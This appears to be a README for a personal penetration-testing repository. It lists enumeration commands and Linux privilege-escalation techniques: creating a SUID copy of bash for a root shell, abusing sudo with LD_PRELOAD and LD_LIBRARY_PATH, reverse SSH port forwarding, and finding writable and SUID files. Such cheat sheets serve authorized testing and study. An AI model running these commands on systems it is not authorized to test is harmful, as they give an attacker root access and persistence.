# Pentest-tools and Knowledge

This repo will contain some of my own pentest scripts and useful commands.
- [Enumeration](#Enumeration)
- [PrivEsc Linux](#PrivEsc_Linux)
- - [PrivEsc Windows](#PrivEsc_Windows)

<a name="Enumeration"></a>
## Enumeration

### List open tcp ports (nmap)
```bash
.\list_open_tcp_ports.sh <IP>
```

<a name="PrivEsc_Linux"></a>
## PrivEsc Linux

### Spawn Root Shell using C
```bash
./root_shell.c
```

### Create copy of /bin/bash
```bash
cp /bin/bash /tmp/evil_bash; chmod +s /tmp/evil_bash
```
Run:
```bash
/tmp/evil_bash -p
```

### SSH Port Forwarding
```bash
ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
```

### Weak File Permissions
Find readable files:
```bash
find /etc -maxdepth 1 -readable -type f
```
Find writable files:
```bash
find /etc -maxdepth 1 -writable -type f
```
Find directories with write access:
```bash
find / -executable -writable -type d 2> /dev/null
```

### Abuse LD_PRELOAD (sudo)

Check:
```bash
sudo -l
```
env_keep+=LD_PRELOAD must be set!

```bash
sudo LD_PRELOAD=/tmp/preload.so <program>
```

### Abuse LD_LIBRARY_PATH (sudo)

Check:
```bash
sudo -l
```
env_keep+=LD_LIBRARY_PATH must be set!

Choose one object from the list. Rename script.
Store script in the current dir.
```bash
ldd /usr/sbin/apache2
```

```bash
sudo LD_LIBRARY_PATH=. apache2
```

### SUID / SGID Files

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

<a name="PrivEsc_Windows"></a>
## PrivEsc Windows
